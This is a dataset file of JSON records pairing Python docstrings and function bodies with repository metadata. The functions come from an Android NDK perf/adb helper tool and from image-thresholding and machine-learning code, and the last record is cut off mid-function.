{"docstring": "\"\"\"Get the default output filename for the current command.\n\nReturns:\n  String containing the default output filename for the current command\n  if the command results in an output file, empty string otherwise.\n\"\"\"\n", "func_signal": "def get_default_output_filename(self):\n", "code": "for command in (self.command, self.sub_command):\n  if command and command.output_filename:\n    return command.output_filename\nreturn ''", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Run an ADB command for a specific device.\n\nArgs:\n  command: Command to execute.\n  command_args: Arguments to pass to the command.\n  error: The message to print if the command fails.\n  **kwargs: Keyword arguments passed to \"command_handler\".\n\nReturns:\n  (stdout, stderr, kbdint) where stdout is a string containing the\n  standard output stream and stderr is a string containing the\n  standard error stream and kbdint is whether a keyboard interrupt\n  occurred.\n\nRaises:\n  CommandFailedError: If the command fails.\n\"\"\"\n", "func_signal": "def run_command(self, command, command_args, error, **kwargs):\n", "code": "return self._run_command(command, command_args,\n                         '%s (device=%s)' % (error, str(self)), True,\n                         **kwargs)", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Execute the command.\"\"\"\n# Signals can only be caught from the main thread so disable capture.\n", "func_signal": "def run(self):\n", "code": "kwargs = dict(self.kwargs)\nkwargs['catch_sigint'] = False\ntry:\n  self.stdout, self.stderr, _ = self.command_handler(\n      self.executable, self.executable_args, self.error, **kwargs)\nexcept CommandFailedError as e:\n  self.returncode = e.returncode", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Get the OS name for the host and the architecture.\n\nReturns:\n  (os_name, architectures) tuple where os_name is a string that contains the\n  name of the OS and architectures is a list of supported processor\n  architectures, in the form used by the AOSP build system.\n\nRaises:\n  Error: If the operating system isn't recognized.\n\"\"\"\n", "func_signal": "def get_host_os_name_architecture():\n", "code": "system_name = platform.system()\nfor regexp, os_name in HOST_SYSTEM_TO_OS_NAME:\n  if regexp.match(system_name):\n    return (os_name, HOST_MACHINE_TYPE_TO_ARCHITECTURE[platform.machine()])\nraise Error('Unknown OS %s' % system_name)", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Get the default input filename for the current command.\n\nReturns:\n  String containing the default input filename for the current command\n  if the command results in an input file, empty string otherwise.\n\"\"\"\n", "func_signal": "def get_default_input_filename(self):\n", "code": "for command in (self.command, self.sub_command):\n  if command and command.input_filename:\n    return command.input_filename\nreturn ''", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Pull a remote file to the host.\n\nArgs:\n  remote_path: Path on the device.\n  local_file: Path to the file on the host.  If the directories to the\n    local file don't exist, they're created.\n\nRaises:\n  CommandFailedError: If the pull fails.\n\"\"\"\n", "func_signal": "def pull(self, remote_path, local_file):\n", "code": "local_dir = os.path.dirname(local_file)\nif not os.path.exists(local_dir):\n  os.makedirs(local_dir)\nself.run_command('pull', [remote_path, local_file],\n                 'Unable to pull %s to %s' % (remote_path, local_file))", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Override the specified signal handler with this instance.\n\nArgs:\n  signal_number: Signal to override with this instance.\n\"\"\"\n", "func_signal": "def acquire(self, signal_number):\n", "code": "assert not self.signal_handler\nself.signal_number = signal_number\nself.signal_handler = signal.signal(self.signal_number, self)", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Gets the name of the apk package to profile from the Manifest.\n\nArgs:\n  manifest_filename: The name of the AndroidManifest file to search through.\n\nReturns:\n  (package_name, activity_name) tuple where package_name is the name of the\n  package and activity is the main activity from the first application in\n  the package.\n\nRaises:\n  Error: If it's not possible to parse the manifest.\n\"\"\"\n", "func_signal": "def get_package_name_from_manifest(manifest_filename):\n", "code": "if not os.path.isfile(manifest_filename):\n  raise Error('Cannot find Manifest %s, please specify the directory '\n              'where the manifest is located with --apk-directory.' % (\n                  manifest_filename))\nxml = minidom.parse(manifest_filename)\nmanifest_tag = xml.getElementsByTagName('manifest')[0]\npackage_name = manifest_tag.getAttribute('package')\napplication_tag = manifest_tag.getElementsByTagName('application')[0]\nfor activity_tag in application_tag.getElementsByTagName('activity'):\n  for intent_filter_tag in activity_tag.getElementsByTagName(\n      'intent-filter'):\n    for action_tag in intent_filter_tag.getElementsByTagName('action'):\n      if (action_tag.getAttribute('android:name') ==\n          'android.intent.action.MAIN'):\n        activity = activity_tag.getAttribute('android:name')\nreturn (package_name, activity)", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Initialize the instance.\n\nArgs:\n  args: List of strings stored in initial_args.\n  verbose: Whether verbose output is enabled.\n\nRaises:\n  PerfArgs.Error: If a perf command isn't supported.\n\"\"\"\n", "func_signal": "def __init__(self, args, verbose):\n", "code": "self.initial_args = args\nself.args = list(args)\nself.man_to_builtin_help()\ncommand_arg = self.args[0] if self.args else 'help'\nself.command = PerfArgs.SUPPORTED_COMMANDS_DICT.get(command_arg)\nif not self.command:\n  raise PerfArgs.Error('Unsupported perf command %s' % command_arg)\nif self.command.verbose and verbose:\n  self.args.append('--verbose')\nself.sub_command = self.get_sub_command()", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Get the architecture of the target device.\n\nArgs:\n  adb_device: The device to query.\n\nReturns:\n  List of compatible architecture strings in the form used by the AOSP build\n  system.\n\"\"\"\n", "func_signal": "def get_target_architectures(adb_device):\n", "code": "architectures = []\nfor abi in adb_device.get_supported_abis():\n  architectures.extend(ANDROID_ABI_TO_ARCHITECTURE[abi])\n# Remove duplicates from the returned list.\nunsorted_architectures = set(architectures)\nsorted_architectures = []\nfor arch in architectures:\n  if arch in unsorted_architectures:\n    unsorted_architectures.remove(arch)\n    sorted_architectures.append(arch)\nreturn sorted_architectures", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Pull a set of remote files to the host.\n\nArgs:\n  remote_local_paths: List of (remote, local) tuples where \"remote\" is the\n    source location on the device and \"local\" is the host path to copy to.\n\nRaises:\n  CommandFailedError: If the pull fails.\n\"\"\"\n", "func_signal": "def pull_files(self, remote_local_paths):\n", "code": "for remote, local in remote_local_paths:\n  self.pull(remote, local)", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Gets the numer of connected android devices.\n\nReturns:\n  The number of connected android devices.\n\nRaises:\n  CommandFailedError: An error occured running the command.\n\"\"\"\n", "func_signal": "def get_devices(self):\n", "code": "out, _, _ = self.run_global_command(\n    'devices', ['-l'], 'Unable to get the list of connected devices.')\nreturn Adb._MATCH_DEVICES.sub(r'', out).splitlines()", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Inserts a process option into the argument list.\n\nInserts a process option into the argument list if the command accepts\na process ID.\n\nArgs:\n  pid: Process ID to add to the argument list.\n\"\"\"\n", "func_signal": "def insert_process_option(self, pid):\n", "code": "if (self.command.name in ('record', 'stat', 'top') or\n    (self.command.name == 'script' and\n     self.sub_command and self.sub_command.name == 'record')):\n  self.args.extend(('-p', str(pid)))", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Start an activity on the device.\n\nArgs:\n  package: Package containing the activity that will be started.\n  activity: Name of the activity to start.\n\nReturns:\n  The process id of the process for the package containing the activity\n  if found.\n\nRaises:\n  CommandFailedError: If the activity fails to start.\n  Error: If it's possible to get the PID of the process.\n\"\"\"\n", "func_signal": "def start_activity(self, package, activity):\n", "code": "package_activity = '%s/%s' % (package, activity)\nout, _, _ = self.shell_command(\n    ' && '.join(['am start -S -n %s' % package_activity,\n                 Adb._GET_PID % package]),\n    'Unable to start Android application %s' % package_activity)\ntry:\n  return int(out.splitlines()[-1])\nexcept (ValueError, IndexError):\n  raise Error(UNABLE_TO_GET_PROCESS_ID % package_activity)", "path": "bin\\android_ndk_perf.py", "repo_name": "google/fplutil", "stars": 332, "license": "apache-2.0", "language": "python", "size": 13675}
{"docstring": "\"\"\"Draws the mask into the provided context, matching the provided viewport.\"\"\"\n\n# Calculate the scale, base coordinates and number of tiles in each dimension...\n", "func_signal": "def draw(self, ctx, vp):\n", "code": "scale = vp.width / float(vp.end_x - vp.start_x)\n\nbase_x = int(numpy.floor(vp.start_x * scale))\nbase_y = int(numpy.floor(vp.start_y * scale))\n\ntile_bx = int(numpy.floor(base_x / float(self.tile_size))) * self.tile_size\ntile_by = int(numpy.floor(base_y / float(self.tile_size))) * self.tile_size\n\n# Loop and draw the required tiles, with the correct offset...\ny = tile_by\nwhile y < int(base_y+vp.height+1):\n  x = tile_bx\n  while x < int(base_x+vp.width+1):\n    tile = self.fetch_tile(scale, x, y)\n\n    ctx.set_source_surface(tile, x - base_x, y - base_y)\n    ctx.rectangle(x - base_x, y - base_y, self.tile_size, self.tile_size)\n    ctx.fill()\n\n    x += self.tile_size\n  y += self.tile_size", "path": "handwriting\\line_graph\\line_layer.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "# Update the model as needed - this will potentially take some time...\n", "func_signal": "def getDataProb(self, sample, state = None):\n", "code": "if self.classifyTrain!=0 and self.classifyData.exemplars()!=0:\n  self.classify.learn(min(self.classifyTrain, self.treeCount), self.classifyData, clamp = self.treeCount, mp=False)\n  self.classifyTrain = 0\n\n# Generate the result and create and return the right output structure...\nret = dict()\n\nif self.classify.size()!=0:\n  eval_c = self.classify.evaluate(MatrixES(sample), which = 'gen')[0]\n  for cat, c in self.cats.iteritems():\n    ret[cat] = eval_c[c] if c<eval_c.shape[0] else 0.0\n\nret[None] = self.density.prob(sample)\n\nreturn ret", "path": "p_cat\\classify_df_kde.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Performs a weighted median for each pixel in a density map - pixels are weighted by 1 minus their distance to the input values density. Uses the given radius to define the window for each pixel. Returns a new modified density map. exp_weight is a weight given to a location based on its value - used to bias towards larger values if set positive for instance.\"\"\"\n", "func_signal": "def density_median(density, radius = 2, exp_weight = 0.0):\n", "code": "ret = density.copy()\n\nsupport = start_cpp() + \"\"\"\nstruct Sam\n{\n float value;\n float weight;\n};\n\nint comp_sam(const void * a, const void * b)\n{\n Sam & fa = *(Sam*)a;\n Sam & fb = *(Sam*)b;\n   \n if (fa.value<fb.value) return -1;\n if (fb.value<fa.value) return 1;\n return 0;\n}\n\"\"\"\n\ncode = start_cpp() + \"\"\"\nint rad = radius;\nfloat ew = exp_weight;\n\nSam * sam = new Sam[(radius * 2 + 1) * (radius * 2 + 1)];\n\nfor (int y=radius; y<Ndensity[0]-radius; y++)\n{\n for (int x=radius; x<Ndensity[1]-radius; x++)\n {\n  // Collect the samples required...\n   float centre_value = DENSITY2(y, x);\n  \n   int total = 0;\n   float total_weight = 0.0;\n   for (int dy=-radius; dy<=radius; dy++)\n   {\n    const int range = radius - abs(dy);\n    for (int dx=-range; dx<=range; dx++)\n    {\n     if ((dx!=0)||(dy!=0)) // Middle pixel doesn't get a vote!\n     {\n      float cv = sam[total].value;\n      if (cv<1e-3) cv = 1e-3;\n      if (cv>1.0) cv = 1.0;\n      \n      sam[total].value = DENSITY2(y+dy, x+dx);\n      sam[total].weight = (1.0 - fabs(centre_value - cv)) * pow(cv, ew);\n      \n      total_weight += sam[total].weight;\n      total += 1;\n     }\n    }\n   }\n   \n  // Sort them...\n   qsort(sam, total, sizeof(Sam), comp_sam);\n  \n  // Find the median, assign the pixel...\n   float remain = 0.5 * total_weight;\n   \n   for (int i=0; i<total; i++)\n   {\n    if (remain>sam[i].weight)\n    {\n     remain -= sam[i].weight;\n    }\n    else\n    {\n     if (i==0) RET2(y, x) = sam[0].value;\n     else\n     {\n      float t = remain / sam[i].weight;\n      RET2(y, x) = (1-t) * sam[i-1].value + t * sam[i].value;\n     }\n     \n     break;\n    }\n   }\n   \n  // Only use it if its larger than - anotehr bias term...\n   if (DENSITY2(y, x)>RET2(y, x)) RET2(y, x) = DENSITY2(y, x);\n }\n}\n\ndelete[] sam;\n\"\"\"\n\nweave.inline(code, ['density', 'ret', 'radius', 'exp_weight'], support_code=support)\n\nreturn ret", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Fetches a tile, given a scale (Multiplication of original dimensions.) and base coordinates (bx, by) - the tile will be the size provided on class initialisation. This request is going through a caching layer, which will hopefuly have the needed tile. If not it will be generated and the tile that has been used the least recently thrown away.\"\"\"\n\n# Instance the key for this tile and check if it is in the cache, if so grab it, rearrange it to the top of the queue and return it...\n", "func_signal": "def fetch_tile(self, scale, bx, by):\n", "code": "key = (scale, bx, by, self.mode)\nif key in self.cache:\n  ret = self.cache[key]\n  del self.cache[key]\n  self.cache[key] = ret\n  return ret\n\n# Select a new tile to render into - either create one or recycle whatever is going to die at the end of the cache...\nif len(self.cache)>=self.cache_size:\n  ret = self.cache.popitem()[1]\nelse:\n  ret = cairo.ImageSurface(cairo.FORMAT_ARGB32, self.tile_size, self.tile_size)\n\n# Render the tile...\n## Background...\nctx = cairo.Context(ret)\n\nctx.save()\nctx.set_source_rgba(0.0, 0.0, 0.0, 0.0)\nctx.set_operator(cairo.OPERATOR_SOURCE)\nctx.paint()\nctx.restore()\n\n## Lines...\nctx.set_line_cap(cairo.LINE_CAP_ROUND)\n\nif self.line!=None:\n  rbx = bx / scale\n  rby = by / scale\n  rsize = self.tile_size / scale\n  for es in self.line.within(rbx, rbx + rsize, rby, rby + rsize):\n    for ei in xrange(*es.indices(self.line.edge_count)):\n      edge = self.line.get_edge(ei)\n      vf = self.line.get_vertex(edge[0])\n      vt = self.line.get_vertex(edge[1])\n      \n      density = 0.5 * (vf[6] + vt[6])\n      if density<1.0:\n        low  = self.colour_zero\n        high = self.colour_one\n      else:\n        density -= 1.0\n        if density>1.0: density = 1.0\n        \n        low  = self.colour_one\n        high = self.colour_two\n        \n      r = (1.0-density) * low[0] + density * high[0]\n      g = (1.0-density) * low[1] + density * high[1]\n      b = (1.0-density) * low[2] + density * high[2]\n      ctx.set_source_rgb(r, g, b)\n        \n      if self.mode==LineLayer.RENDER_CORRECT: ctx.set_line_width(scale * (vf[4] + vt[4]))\n      elif self.mode==LineLayer.RENDER_THIN: ctx.set_line_width(1.0)\n      elif self.mode==LineLayer.RENDER_ONE: ctx.set_line_width(scale)\n      else: ctx.set_line_width(vf[4] + vt[4])\n\n      ctx.move_to(scale * vf[0] - bx, scale * vf[1] - by)\n      ctx.line_to(scale * vt[0] - bx, scale * vt[1] - by)\n\n      ctx.stroke()\n\n# Store the tile in the cache and return...\nself.cache[key] = ret\nreturn ret", "path": "handwriting\\line_graph\\line_layer.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "# Update the models as needed - this will potentially take some time...\n", "func_signal": "def getDataProbList(self, sample, state = None):\n", "code": "if self.classifyTrain!=0 and self.classifyData.exemplars()!=0:\n  self.classify.learn(min(self.classifyTrain, self.treeCount), self.classifyData, clamp = self.treeCount, mp=False)\n  self.classifyTrain = 0\n\n# Fetch the required information...\nif self.classify.size()!=0:\n  eval_c = self.classify.evaluate(MatrixES(sample), which = 'gen_list')[0]\nelse:\n  return [{None:1.0}]\n\neval_d = self.density.prob(sample)\n\n# Construct and return the output...\nret = []\n\nfor ec in eval_c:\n  r = {None:eval_d}\n\n  for cat, c in self.cats.iteritems():\n    r[cat] = ec[c] if c<ec.shape[0] else 0.0\n\n  ret.append(r)\n\nreturn ret", "path": "p_cat\\classify_df_kde.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Same as threshold, except it uses graph cuts to regularise the output. You provide the data difference, which is the bias towards the original thresholding label of each pixel, and a smooth max, which is the maximum cost of two labels being different. half_life then modulates the smoothing, by defining the colourmetric distance at which the cost of difference becomes 0. You can optionally provide a force array, same shape and size as the image, where 0 means to process as normal, 1 means fix to background, 2 means fix to foreground.\"\"\"\n\n# Create a binary labelling object...\n", "func_signal": "def threshold_density(image, density, bg_cost = 0.5, data_mult = 32.0, smooth_max = 16.0, lonely = 0.75, half_life = 32.0, force = None):\n", "code": "bl = BinaryLabel((image.shape[0], image.shape[1]))\n\n# Use the density estimate to set the costs......\nbl.addCostTrue((density<1e-3).astype(numpy.float32) * bg_cost)\nbl.addCostFalse(numpy.clip(density, 0.0, 1.0) * data_mult)\n\n# Add in the smoothing terms...\n## Dimension 0...\ndist = numpy.square(image[1:,:].astype(numpy.float32) - image[:-1,:].astype(numpy.float32)).sum(axis=2)\nbl.addCostDifferent(0, (smooth_max * half_life) / (half_life + dist))\n\n## Dimension 1...\ndist = numpy.square(image[:,1:].astype(numpy.float32) - image[:,:-1].astype(numpy.float32)).sum(axis=2)\nbl.addCostDifferent(1, (smooth_max * half_life) / (half_life + dist))\n\n# Avoid noise!..\nbl.setLonelyCost(lonely)\n\n# Lock some pixels, at the users request...\nif force is not None:\n  fix = numpy.zeros(force.shape, dtype=numpy.int8)\n  fix[force==1] = -1\n  fix[force==2] = 1\n  \n  bl.fix(fix)\n\n# Solve the binary labelling to get the final output, return it...\nreturn bl.solve()[0]", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Given a mask this dilates it repeat times, and returns the new mask. Uses a simple diamond mask, which is the 4 neighbours of each pixel.\"\"\"\n", "func_signal": "def dilate(mask, repeat = 1):\n", "code": "ret = mask.copy()\n\nfor _ in xrange(repeat):\n  prev = ret.copy()\n  numpy.logical_or(ret[1:,:], prev[:-1,:], ret[1:,:])\n  numpy.logical_or(ret[:-1,:], prev[1:,:], ret[:-1,:])\n  numpy.logical_or(ret[:,1:], prev[:,:-1], ret[:,1:])\n  numpy.logical_or(ret[:,:-1], prev[:,1:], ret[:,:-1])\n\nreturn ret", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Builds a colour cube, and applies mean shift to it (Each location is weighted by the number of pixels that have that colour), to cluster the colours. Each cluster is then assigned to be foreground or background. The return value is a tuple: (boolean array, indexed by [r,g,b] of False for background, True for foreground, a TPS thin plate spline object, that assigns a density value to every location in the colour cube.).\"\"\"\n\n# Prepare the data, applying the halving...\n", "func_signal": "def cluster_colour(image, size = 16.0, kernel = 'epanechnikov', halves = 3):\n", "code": "data = image.reshape((-1,3)).copy()\ndim = 256\n\nscale = 1\nfor _ in xrange(halves):\n  data /= 2\n  dim /= 2\n  size *= 0.5\n  scale *= 2\n\n# Count how many instances of each colour exist, building a 3D colour cube...\nexploded = data[:,0].astype(numpy.uint32) * dim * dim + data[:,1].astype(numpy.uint32) * dim + data[:,2].astype(numpy.uint32)\n\nc_cube = numpy.bincount(exploded, minlength=dim*dim*dim)\nc_cube = c_cube.reshape((dim,dim,dim))\n\ndel exploded\ndel data\n\n# Setup mean shift...\nms = MeanShift()\nms.set_data(c_cube, 'bbb', 3)\n\nms.set_kernel(kernel)\nms.set_spatial('iter_dual')\nms.set_balls('hash')\n\nms.set_scale(numpy.array([1.0/size, 1.0/size, 1.0/size]))\n\n# Run it, to get cluster information for every pixel...\nmodes, indices = ms.cluster()\n\n# Calculate the size of each cluster...\nindex = indices.flatten() >= 0\nsizes = numpy.bincount(indices.flatten()[index], c_cube.flatten()[index])\n\n# Select the largest cluster as the background - everything else is foreground...\nbg = numpy.argmax(sizes)\n\n# Create the bg/fg colour cube boolean map...\nbg_cube = indices!=bg\n\n# Create a data matrix to train a thin plate spline from - iterate the foreground clusters, and for each take a slice and linearise the cumulative probability over this range...\npoints = []\n\nsamples = 1024\ncum_samples = 64\n\nmain_fg = numpy.concatenate((sizes[:bg], numpy.array([-1.0]), sizes[bg+1:])).argmax()\nthreshold = 0.5 * sizes[main_fg]\n\nfor i in [main_fg]: #xrange(modes.shape[0]):\n  if i==bg: continue\n  if sizes[i]<threshold: continue\n  \n  # We have the index of the centre of a valid cluster - calculate evenly spaced coordinates along the line connecting its centre to the background centre...\n  delta = modes[i,:] - modes[bg,:]\n  \n  best_dot = 1e64\n  best_vec = None\n  for i in xrange(3):\n    vec = numpy.zeros(3)\n    vec[i] = 1.0\n    dot = delta.dot(vec)\n    if dot<best_dot:\n      best_dot = dot\n      best_vec = vec\n    \n  perpA = numpy.cross(delta, best_vec)\n  perpB = numpy.cross(delta, perpA)\n  perpA *= 0.5 / numpy.sqrt(perpA.dot(perpA))\n  perpB *= 0.5 / numpy.sqrt(perpB.dot(perpB))\n  \n  r = numpy.linspace(modes[bg,0], modes[bg,0] + 2.0*delta[0], samples)\n  g = numpy.linspace(modes[bg,1], modes[bg,1] + 2.0*delta[1], samples)\n  b = numpy.linspace(modes[bg,2], modes[bg,2] + 2.0*delta[2], samples)\n  sams = numpy.concatenate((r.reshape((-1,1)), g.reshape((-1,1)), b.reshape((-1,1))), axis=1)\n  \n  # Calculate a probability for each entry in sams...\n  probs = ms.probs(sams)\n  \n  # Calculate a cluster assignment for each entry in sams...\n  clusters = ms.assign_clusters(sams)\n  \n  # Zero all entries that belong to the background...\n  probs[clusters==bg] = 0.0\n  \n  # Make the probabilities cumulative, smooth them and normalise...\n  probs = numpy.cumsum(probs)\n  probs /= probs[probs.shape[0]//2]\n  \n  # Find the requested sample points and add them to the points array...\n  cs = numpy.ceil(cum_samples * float(sizes[i]) / float(sizes[main_fg]))\n  \n  for val in numpy.linspace(1e-6, 2.0, cum_samples):\n    high = numpy.searchsorted(probs, val)\n    if high==probs.shape[0]: break\n    \n    low = high - 1\n    if low<0:\n      low = 0\n      high = 1\n      \n    t = (val - probs[low]) / (probs[high] - probs[low])\n    \n    loc = (1.0-t) * sams[low,:] + t * sams[high,:]\n    \n    points.append((loc+perpA+perpB, val))\n    points.append((loc+perpA-perpB, val))\n    points.append((loc-perpA+perpB, val))\n    points.append((loc-perpA-perpB, val))\n\ndm_x = numpy.concatenate(map(lambda s: s[0].reshape((1,-1)), points), axis=0)\ndm_y = numpy.array(map(lambda s: s[1], points))\n\n# Fit the thin plate spline to the points...\ntps = TPS(3)\ntps.learn(dm_x * scale, dm_y)\n\n# Scale up the bg cube, to undo the halving...\nbg_cube = bg_cube.repeat(scale, axis=0)\nbg_cube = bg_cube.repeat(scale, axis=1)\nbg_cube = bg_cube.repeat(scale, axis=2)\n\n# Do the return...\nreturn (bg_cube, tps)", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Same as threshold, except it uses graph cuts to regularise the output. You provide the data difference, which is the bias towards the original thresholding label of each pixel, and a smooth max, which is the maximum cost of two labels being different. half_life then modulates the smoothing, by defining the colourmetric distance at which the cost of difference becomes 0.\"\"\"\n\n# Create a binary labelling object...\n", "func_signal": "def threshold_reg(image, model, data_diff = 1.0, smooth_max = 4.0, half_life = 32.0):\n", "code": "bl = BinaryLabel((image.shape[0], image.shape[1]))\n\n# Add in the basic thresholding result, with the given difference...\ninitial = threshold(image, model)\nbl.addCostFalse(initial * data_diff)\nbl.addCostTrue((1.0-initial) * data_diff)\n\n# Add in the smoothing terms...\n## Dimension 0...\ndist = numpy.square(image[1:,:].astype(numpy.float32) - image[:-1,:].astype(numpy.float32)).sum(axis=2)\nbl.addCostDifferent(0, (smooth_max * half_life) / (half_life + dist))\n\n## Dimension 1...\ndist = numpy.square(image[:,1:].astype(numpy.float32) - image[:,:-1].astype(numpy.float32)).sum(axis=2)\nbl.addCostDifferent(1, (smooth_max * half_life) / (half_life + dist))\n\n# Solve the binary labelling to get the final output, return it...\nreturn bl.solve()[0]", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Bodges the internal representation so it can provide a non-singular covariance matrix - obviously a total hack, but potentially useful when insufficient information exists. Works by taking the svd, nudging zero entrys away from 0 in the diagonal matrix, then multiplying the terms back together again. End result is arbitary, but won't be inconsistant with the data provided.\"\"\"\n", "func_signal": "def makeSafe(self):\n", "code": "u, s, v = numpy.linalg.svd(self.scatter)\n\nepsilon = 1e-5\nfor i in xrange(s.shape[0]):\n  if math.fabs(s[i])<epsilon:\n    s[i] = math.copysign(epsilon, s[i])\n\nself.scatter[:,:] = numpy.dot(u, numpy.dot(numpy.diag(s), v))", "path": "gcp\\gaussian_inc.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Given a 1D array and a total this returns the smallest interval (as (start (inclusive), end (exclusive))) that contains the given amount of the total.\"\"\"\n\n# Create matrix containing the total for every range...\n", "func_signal": "def tight_total(data, total):\n", "code": "cs = numpy.append(numpy.array([0], dtype=data.dtype), numpy.cumsum(data))\nassert(total<=cs[-1])\nscale = cs.reshape((1,-1)) - cs.reshape((-1,1))\n\n# Fetch those that are over the total, and find the one with the shortest range...\nvalid = numpy.argwhere(scale>=total)\nindex = numpy.argsort(valid[:,1]-valid[:,0])[0]\n\n# Return the range tuple...\nreturn (valid[index,0], valid[index,1])", "path": "handwriting\\let\\threshold.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"prec is the precision matrix for the density estimate done with kernel density estimation; cap is the component cap for said kernel density estimate. treeCount is how many trees to use for the classifying decision forest whilst incAdd is how many to train for each new sample. testDims is the number of dimensions to use for each test, dimCount the number of combinations of dimensions to try for generating each nodes decision and rotCount the number of orientations to try for each nodes test generation.\"\"\"\n# Support structures...\n", "func_signal": "def __init__(self, prec, cap, treeCount, incAdd = 1, testDims = 3, dimCount = 4, rotCount = 32):\n", "code": "self.cats = dict() # Dictionary from cat to internal indexing number.\nself.treeCount = treeCount\nself.incAdd = incAdd\n\n# Setup the classification forest...\nself.classify = DF()\nself.classify.setInc(True)\nself.classify.setGoal(Classification(None, 1))\nself.classify.setGen(LinearClassifyGen(0, 1, testDims, dimCount, rotCount))\n\nself.classifyData = MatrixGrow()\nself.classifyTrain = self.treeCount\n\n# Setup the density estimation kde...\nself.density = KDE_INC(prec, cap)", "path": "p_cat\\classify_df_kde.py", "repo_name": "thaines/helit", "stars": 330, "license": "None", "language": "python", "size": 2456}
{"docstring": "\"\"\"Given a mask this smooths it using a vaugly-not-stupid techneque based on signed distance to the edge of the line - converts the mask, then smoothes it using an oriented filter, that strongly enforces smooth contours and applies sub-pixel estimation. It then converts it back to a mask using the sign of the resulting distance. Should smoooth out bumps and sharpen small angle intersections.\"\"\"\n\n# Convert to signed distance, using the 8 way neighbourhood (With sqrt(2) for the diagonals)...\n## Initalise with effective infinities...\n", "func_signal": "def smooth_signed_distance(mask, iters = 1):\n", "code": "sigdist = numpy.empty(mask.shape, dtype=numpy.float32)\nsigdist[:,:] = 1e64\n\n## Mark all pixels that are at a transition boundary with the relevant cost - first the diagonals, then the halfs, as half is less than sqrt(2)...\ntran_sqrt2 = numpy.zeros(sigdist.shape, dtype=numpy.bool)\nnumpy.logical_or(mask[1:,1:]!=mask[:-1,:-1], tran_sqrt2[:-1,:-1], tran_sqrt2[:-1,:-1])\nnumpy.logical_or(mask[1:,:-1]!=mask[:-1,1:], tran_sqrt2[:-1,1:], tran_sqrt2[:-1,1:])\nnumpy.logical_or(mask[:-1,1:]!=mask[1:,:-1], tran_sqrt2[1:,:-1], tran_sqrt2[1:,:-1])\nnumpy.logical_or(mask[:-1,:-1]!=mask[1:,1:], tran_sqrt2[1:,1:], tran_sqrt2[1:,1:])\nsigdist[tran_sqrt2] = numpy.sqrt(2.0)\n\ntran_half = numpy.zeros(sigdist.shape, dtype=numpy.bool)\nnumpy.logical_or(mask[1:,:]!=mask[:-1,:], tran_half[:-1,:], tran_half[:-1,:])\nnumpy.logical_or(mask[:-1,:]!=mask[1:,:], tran_half[1:,:], tran_half[1:,:])\nnumpy.logical_or(mask[:,1:]!=mask[:,:-1], tran_half[:,:-1], tran_half[:,:-1])\nnumpy.logical_or(mask[:,:-1]!=mask[:,1:], tran_half[:,1:], tran_half[:,1:])\nsigdist[tran_half] = 0.5\n\n## Do all 8 directions of sweep iterativly until distances stop getting smaller...\nstop = False\nwhile not stop:\n  stop = True\n  \n  code = start_cpp() + \"\"\"\n  float sqrt2 = sqrt(2.0);\n  \n  // Forwards pass...\n   for (int y=0; y<Nsigdist[0]; y++)\n   {\n    for (int x=0; x<Nsigdist[1]; x++)\n    {\n     bool negx = x!=0;\n     bool negy = y!=0;\n     \n     if ((negx)&&((SIGDIST2(y, x-1)+1.0)<SIGDIST2(y, x)))\n     {\n      SIGDIST2(y, x) = SIGDIST2(y, x-1) + 1.0;\n      stop = false;\n     }\n     \n     if ((negy)&&((SIGDIST2(y-1, 